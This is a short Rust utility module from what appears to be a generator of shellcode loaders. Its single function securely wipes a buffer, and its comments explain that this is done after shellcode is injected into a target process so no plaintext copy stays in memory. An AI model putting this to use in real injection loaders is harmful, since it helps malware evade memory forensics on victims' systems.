// Shared utilities injected into every generated loader.
//
// This file is copied verbatim into the `src/` of each generated project by
// the generator and declared as `mod common;` via the {{COMMON_MODULE}}
// placeholder. Keeping these helpers here means there is a single source of
// truth instead of one copy per template.

/// Zero a buffer in a way that resists compiler optimisation, then clear it.
///
/// Used after the shellcode has been written into the target process so that
/// no plaintext copy lingers in the loader's own memory.
pub fn wipe(buf: &mut Vec<u8>) {
    for b in buf.iter_mut() {
        unsafe {
            std::ptr::write_volatile(b as *mut u8, 0);
        }
    }
    buf.clear();
}
